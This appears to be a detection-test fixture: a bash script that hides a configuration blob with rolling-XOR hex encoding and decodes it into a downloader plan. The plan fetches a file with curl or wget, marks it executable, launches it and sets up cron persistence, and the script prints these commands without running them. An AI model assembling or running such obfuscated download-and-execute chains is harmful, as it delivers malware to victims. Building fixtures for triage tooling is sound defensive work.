#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_ca586fbf='281524582b5f3a4a39047406690f660a6f30583744301c7d1e6f1a7301643b492c412e5a3f1364167f0b6e31573e52371b7810711f781d422f4024416d096013630276157d2252204f2c493a4935543051215530427f086f0a7e21403251396600610d610362016a1665117017722d4e21543a4e73463a59385525442d4a247b12764b28492454355c3b55781c2e1e2a1c2f162f1d295520523e036b1f6b1b68527d523604340036053c0537032d4830513c4c20456b026c1a7b177e1a35023600360e6d596846355d21542742306f0e690c62162b6316780c7e1b681b5736547b1f2d1d291f2c152c1e2a56305935500f7f1e6a023f10640979563e4b2551234635466b08690a6207280675016007624f2b19291d2b1821182a1e620371127a255527482a4f7207690865002d403c4f2a582e4724411e70117c1924512145245035187c4e7e4a7c4f764f7d4967147103751c7f1a66057718762959384c2419365327446b087a157b55311e6b1b7f1e6a0f224674447046754c754773'
  readonly Codec_ca586fbf='hex_compact|rolling_xor|5e'

  Load_ca586fbf() {
    item1=()
    local raw="${Material_ca586fbf}" item5
    for ((item5=0; item5<${#raw}; item5+=2)); do item1+=("$((16#${raw:item5:2}))"); done
  }

  Decode_ca586fbf() {
    item2=()
    local item7=94
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2+=("$((item1[item5] ^ item7))")
      item7=${item1[item5]}
    done
  }

  Recover_ca586fbf() {
    local -a item1 item2
    local item3 item4 item8 item5
    local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"
    Load_ca586fbf
    local decode_target=Decode_ca586fbf; "$decode_target"
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_ca586fbf() { local recovered field; local -a fields; recovered="$(Recover_ca586fbf)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_ca586fbf() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_ca586fbf)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_ca586fbf; fi
